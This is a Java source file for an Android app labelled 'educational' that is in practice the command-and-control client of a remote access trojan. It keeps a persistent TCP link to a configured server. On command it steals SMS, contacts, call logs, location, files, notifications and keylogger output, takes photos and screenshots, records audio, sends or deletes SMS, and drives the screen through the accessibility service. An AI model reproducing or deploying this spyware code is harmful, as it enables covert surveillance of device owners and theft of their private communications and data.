package com.remoteaccess.educational.network;

import android.content.Context;
import android.util.Log;
import com.remoteaccess.educational.advanced.NotificationInterceptor;
import com.remoteaccess.educational.commands.*;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.utils.Constants;
import com.remoteaccess.educational.utils.DeviceInfo;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class SocketManager {

    private static final String TAG = "SocketManager";

    private static SocketManager instance;
    private Socket tcpSocket;
    private PrintWriter out;
    private BufferedReader in;
    private Context context;
    private boolean connected = false;
    private boolean running   = false;

    private final ExecutorService          executor          = Executors.newCachedThreadPool();
    private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?>             heartbeatFuture;

    // Command Handlers
    private CommandExecutor   commandExecutor;
    private SMSHandler        smsHandler;
    private ContactsHandler   contactsHandler;
    private CallLogsHandler   callLogsHandler;
    private CameraHandler     cameraHandler;
    private ScreenshotHandler screenshotHandler;
    private FileHandler       fileHandler;
    private AudioRecorder     audioRecorder;

    public static SocketManager getInstance(Context context) {
        if (instance == null) {
            instance = new SocketManager(context);
        }
        return instance;
    }

    public SocketManager(Context context) {
        this.context       = context;
        commandExecutor    = new CommandExecutor(context);
        smsHandler         = new SMSHandler(context);
        contactsHandler    = new ContactsHandler(context);
        callLogsHandler    = new CallLogsHandler(context);
        cameraHandler      = new CameraHandler(context);
        screenshotHandler  = new ScreenshotHandler(context);
        fileHandler        = new FileHandler(context);
        audioRecorder      = new AudioRecorder(context);
    }

    // ── Connection lifecycle ────────────────────────────────────────────────

    public void connect() {
        if (running) {
            Log.d(TAG, "connect() called but already running — skipping");
            return;
        }
        running = true;
        executor.execute(() -> {
            while (running) {
                try {
                    Log.d(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                    tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);

                    // Enable OS-level TCP keep-alive so the kernel sends keep-alive
                    // probes and detects dead connections on its own
                    tcpSocket.setKeepAlive(true);

                    out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                    in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
                    connected = true;

                    Log.d(TAG, "TCP connected — enabling heartbeat");
                    registerDevice(DeviceInfo.getDeviceId(context));
                    startHeartbeat();
                    listenForMessages();          // blocks until connection drops

                } catch (Exception e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    connected = false;
                } finally {
                    stopHeartbeat();
                    connected = false;
                }

                if (running) {
                    Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
                    try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); }
                    catch (InterruptedException ignored) {}
                }
            }
        });
    }

    // ── Heartbeat (keep-alive toward the server) ────────────────────────────

    /**
     * Schedule a heartbeat every HEARTBEAT_INTERVAL ms.
     * The server's PONG_TIMEOUT is 45 000 ms; our interval is 20 000 ms —
     * well within the deadline.
     */
    private void startHeartbeat() {
        stopHeartbeat();   // cancel any stale future
        String deviceId = DeviceInfo.getDeviceId(context);
        heartbeatFuture = heartbeatExecutor.scheduleAtFixedRate(
            () -> {
                if (connected) {
                    sendHeartbeat(deviceId);
                    Log.d(TAG, "Heartbeat sent");
                }
            },
            Constants.HEARTBEAT_INTERVAL,
            Constants.HEARTBEAT_INTERVAL,
            TimeUnit.MILLISECONDS
        );
    }

    private void stopHeartbeat() {
        if (heartbeatFuture != null && !heartbeatFuture.isCancelled()) {
            heartbeatFuture.cancel(false);
            heartbeatFuture = null;
        }
    }

    // ── Message loop ────────────────────────────────────────────────────────

    private void listenForMessages() {
        try {
            String line;
            while (running && (line = in.readLine()) != null) {
                final String message = line;
                executor.execute(() -> processMessage(message));
            }
        } catch (Exception e) {
            Log.e(TAG, "Read error: " + e.getMessage());
        } finally {
            connected = false;
        }
    }

    private void processMessage(String message) {
        try {
            JSONObject json  = new JSONObject(message);
            String     event = json.getString("event");
            JSONObject data  = json.optJSONObject("data");

            Log.d(TAG, "Event received: " + event);

            // ── Respond to server pings immediately ──────────────────────
            // Server sends "device:ping" every 15 s and drops the client
            // if no "device:pong" is received within 45 s.
            if (event.equals("device:ping")) {
                sendPong();
                return;
            }

            if (event.equals("command:execute") && data != null) {
                String     commandId = data.optString("commandId", "");
                String     command   = data.getString("command");
                JSONObject params    = data.optJSONObject("params");
                handleCommand(commandId, command, params);
            }

        } catch (JSONException e) {
            Log.e(TAG, "Error parsing message: " + e.getMessage());
        }
    }

    // ── Send helpers ────────────────────────────────────────────────────────

    private synchronized void sendMessage(String event, JSONObject data) {
        if (out != null && connected) {
            try {
                JSONObject message = new JSONObject();
                message.put("event", event);
                message.put("data", data);
                out.print(message.toString() + "\n");
                out.flush();
            } catch (JSONException e) {
                Log.e(TAG, "Error building message: " + e.getMessage());
            }
        } else {
            Log.w(TAG, "Not connected, cannot send: " + event);
        }
    }

    public void emit(String event, JSONObject data) {
        sendMessage(event, data);
    }

    /**
     * Reply to the server's "device:ping" event.
     * The server listens for "device:pong" to reset its PONG_TIMEOUT timer.
     */
    private void sendPong() {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", DeviceInfo.getDeviceId(context));
            sendMessage("device:pong", data);
            Log.d(TAG, "Pong sent");
        } catch (JSONException e) {
            Log.e(TAG, "Error sending pong: " + e.getMessage());
        }
    }

    public void registerDevice(String deviceId) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("name",           DeviceInfo.getDeviceName());
            deviceInfo.put("model",          DeviceInfo.getModel());
            deviceInfo.put("androidVersion", DeviceInfo.getAndroidVersion());
            deviceInfo.put("manufacturer",   android.os.Build.MANUFACTURER);

            JSONObject data = new JSONObject();
            data.put("deviceId",   deviceId);
            data.put("userId",     "");
            data.put("deviceInfo", deviceInfo);

            sendMessage("device:register", data);
            Log.d(TAG, "Device registered: " + deviceId);
        } catch (JSONException e) {
            Log.e(TAG, "Error registering device: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            sendMessage("device:heartbeat", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
        }
    }

    public void sendResponse(String commandId, String command, Object result) {
        try {
            JSONObject data = new JSONObject();
            data.put("commandId", commandId);
            data.put("response",  result != null ? result.toString() : "");
            sendMessage("command:response", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending response: " + e.getMessage());
        }
    }

    public void disconnect() {
        running   = false;
        connected = false;
        stopHeartbeat();
        try {
            if (tcpSocket != null) tcpSocket.close();
        } catch (Exception e) {
            Log.e(TAG, "Error disconnecting: " + e.getMessage());
        }
    }

    // ── Command dispatch ────────────────────────────────────────────────────

    private void handleCommand(String commandId, String command, JSONObject params) {
        JSONObject result;

        try {
            if (command.equals("ping")
                    || command.equals("vibrate")
                    || command.equals("play_sound")
                    || command.equals("get_clipboard")
                    || command.equals("set_clipboard")
                    || command.equals("get_device_info")
                    || command.equals("get_location")
                    || command.equals("get_installed_apps")
                    || command.equals("get_battery_info")
                    || command.equals("get_network_info")
                    || command.equals("get_wifi_networks")
                    || command.equals("get_system_info")) {
                result = commandExecutor.executeCommand(command, params);

            } else if (command.equals("get_all_sms")) {
                int limit = params != null ? params.optInt("limit", 100) : 100;
                result = smsHandler.getAllSMS(limit);
            } else if (command.equals("get_sms_from_number")) {
                String phoneNumber = params.getString("phoneNumber");
                int    limit       = params.optInt("limit", 50);
                result = smsHandler.getSMSFromNumber(phoneNumber, limit);
            } else if (command.equals("send_sms")) {
                String phoneNumber = params.getString("phoneNumber");
                String msg         = params.getString("message");
                result = smsHandler.sendSMS(phoneNumber, msg);
            } else if (command.equals("delete_sms")) {
                String smsId = params.getString("smsId");
                result = smsHandler.deleteSMS(smsId);

            } else if (command.equals("get_all_contacts")) {
                result = contactsHandler.getAllContacts();
            } else if (command.equals("search_contacts")) {
                String query = params.getString("query");
                result = contactsHandler.searchContacts(query);

            } else if (command.equals("get_all_call_logs")) {
                int limit = params != null ? params.optInt("limit", 100) : 100;
                result = callLogsHandler.getAllCallLogs(limit);
            } else if (command.equals("get_call_logs_by_type")) {
                int callType = params.getInt("callType");
                int limit    = params.optInt("limit", 50);
                result = callLogsHandler.getCallLogsByType(callType, limit);
            } else if (command.equals("get_call_logs_from_number")) {
                String phoneNumber = params.getString("phoneNumber");
                int    limit       = params.optInt("limit", 50);
                result = callLogsHandler.getCallLogsFromNumber(phoneNumber, limit);
            } else if (command.equals("get_call_statistics")) {
                result = callLogsHandler.getCallStatistics();

            } else if (command.equals("get_available_cameras")) {
                result = cameraHandler.getAvailableCameras();
            } else if (command.equals("take_photo")) {
                String cameraId = params.optString("cameraId", "0");
                String quality  = params.optString("quality", "high");
                result = cameraHandler.takePhoto(cameraId, quality);

            } else if (command.equals("take_screenshot")) {
                result = screenshotHandler.takeScreenshot();

            } else if (command.equals("list_files")) {
                String path = params != null ? params.optString("path", null) : null;
                result = fileHandler.listFiles(path);
            } else if (command.equals("read_file")) {
                String  filePath = params.getString("filePath");
                boolean asBase64 = params.optBoolean("asBase64", false);
                result = fileHandler.readFile(filePath, asBase64);
            } else if (command.equals("write_file")) {
                String  filePath = params.getString("filePath");
                String  content  = params.getString("content");
                boolean isBase64 = params.optBoolean("isBase64", false);
                result = fileHandler.writeFile(filePath, content, isBase64);
            } else if (command.equals("delete_file")) {
                String filePath = params.getString("filePath");
                result = fileHandler.deleteFile(filePath);
            } else if (command.equals("copy_file")) {
                String sourcePath = params.getString("sourcePath");
                String destPath   = params.getString("destPath");
                result = fileHandler.copyFile(sourcePath, destPath);
            } else if (command.equals("move_file")) {
                String sourcePath = params.getString("sourcePath");
                String destPath   = params.getString("destPath");
                result = fileHandler.moveFile(sourcePath, destPath);
            } else if (command.equals("create_directory")) {
                String path = params.getString("path");
                result = fileHandler.createDirectory(path);
            } else if (command.equals("get_file_info")) {
                String filePath = params.getString("filePath");
                result = fileHandler.getFileInfo(filePath);
            } else if (command.equals("search_files")) {
                String directory = params.getString("directory");
                String query     = params.getString("query");
                result = fileHandler.searchFiles(directory, query);

            } else if (command.equals("start_recording")) {
                String filename = params != null ? params.optString("filename", null) : null;
                result = audioRecorder.startRecording(filename);
            } else if (command.equals("stop_recording")) {
                result = audioRecorder.stopRecording();
            } else if (command.equals("get_recording_status")) {
                result = audioRecorder.getStatus();
            } else if (command.equals("get_audio")) {
                String filePath = params.getString("filePath");
                result = audioRecorder.getAudioAsBase64(filePath);
            } else if (command.equals("list_recordings")) {
                result = audioRecorder.listRecordings();
            } else if (command.equals("delete_recording")) {
                String filePath = params.getString("filePath");
                result = audioRecorder.deleteRecording(filePath);

            } else if (command.equals("get_keylogs")) {
                int limit = params != null ? params.optInt("limit", 100) : 100;
                result = KeyloggerService.getKeylogs(context, limit);
            } else if (command.equals("clear_keylogs")) {
                result = KeyloggerService.clearLogs(context);

            } else if (command.equals("get_notifications")) {
                result = NotificationInterceptor.getAllNotifications();
            } else if (command.equals("get_notifications_from_app")) {
                String packageName = params.getString("packageName");
                result = NotificationInterceptor.getNotificationsFromApp(packageName);
            } else if (command.equals("clear_notifications")) {
                result = NotificationInterceptor.clearAllNotifications();

            } else if (command.equals("touch") || command.equals("swipe")
                    || command.equals("press_back") || command.equals("press_home")
                    || command.equals("press_recents") || command.equals("open_notifications")
                    || command.equals("scroll_up") || command.equals("scroll_down")) {
                UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
                if (accessSvc == null) {
                    result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Accessibility service not running");
                } else {
                    ScreenController sc = new ScreenController(accessSvc);
                    switch (command) {
                        case "touch":
                            result = sc.touch(params.getInt("x"), params.getInt("y"), params.optInt("duration", 100));
                            break;
                        case "swipe":
                            result = sc.swipe(params.getInt("startX"), params.getInt("startY"), params.getInt("endX"), params.getInt("endY"), params.optInt("duration", 300));
                            break;
                        case "press_back":    result = sc.pressBack();         break;
                        case "press_home":    result = sc.pressHome();         break;
                        case "press_recents": result = sc.pressRecents();      break;
                        case "open_notifications": result = sc.openNotifications(); break;
                        case "scroll_up":     result = sc.scrollUp();          break;
                        case "scroll_down":   result = sc.scrollDown();        break;
                        default:
                            result = new JSONObject();
                            result.put("success", false);
                            result.put("error", "Unknown screen control command");
                    }
                }

            } else if (command.equals("read_screen") || command.equals("find_by_text")
                    || command.equals("get_current_app") || command.equals("get_clickable_elements")
                    || command.equals("get_input_fields")) {
                UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
                if (accessSvc == null) {
                    result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Accessibility service not running");
                } else {
                    ScreenReader sr = new ScreenReader(accessSvc);
                    switch (command) {
                        case "read_screen":           result = sr.readScreen();        break;
                        case "find_by_text":          result = sr.findByText(params.getString("text")); break;
                        case "get_current_app":       result = sr.getCurrentApp();    break;
                        case "get_clickable_elements":result = sr.getClickableElements(); break;
                        case "get_input_fields":      result = sr.getInputFields();   break;
                        default:
                            result = new JSONObject();
                            result.put("success", false);
                            result.put("error", "Unknown screen reader command");
                    }
                }

            } else {
                result = new JSONObject();
                result.put("success", false);
                result.put("error", "Unknown command: " + command);
            }

            sendResponse(commandId, command, result);

        } catch (Exception e) {
            Log.e(TAG, "Error handling command: " + e.getMessage());
            try {
                JSONObject errorResult = new JSONObject();
                errorResult.put("success", false);
                errorResult.put("error", e.getMessage());
                sendResponse(commandId, command, errorResult);
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
    }
}
